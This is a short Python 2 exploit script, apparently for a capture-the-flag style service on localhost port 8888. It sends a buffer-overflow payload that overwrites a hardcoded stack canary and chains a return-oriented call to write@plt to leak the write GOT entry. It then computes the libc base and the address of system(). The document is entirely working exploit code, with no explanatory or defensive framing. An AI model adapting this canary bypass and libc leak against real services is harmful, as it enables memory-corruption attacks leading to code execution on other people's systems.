from socket import *
from struct import *
from time import *

s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 8888))


p = lambda x:pack("<L", x)
up = lambda x:unpack("<L", x)[0]


canary = 0x78c25000
pop3ret = 0x8048b2c

write_plt = 0x80486e0
write_got = 0x804b040

payload = ""
payload += 'y'*10
payload += p(canary)
payload += "a"*12

payload += p(write_plt)
payload += p(pop3ret)
payload += p(4)
payload += p(write_got)
payload += p(4)

print s.recv(1024)
print s.recv(1024)
sleep(3)
s.send("4\n")
print s.recv(1024)
sleep(0.5)
print s.recv(1024)
print "[*] Send Payload"
s.send(payload)

got = up(s.recv(1024))
print "[+] Write_got Leak !!"
print "[+] Write_got = " + hex(got)
libc_base = got - 0xd43c0
print "[+] Libc Base = " + hex(libc_base)
print "[+] System() = " + hex(got - (0xd43c0 - 0x3a940))
s.close()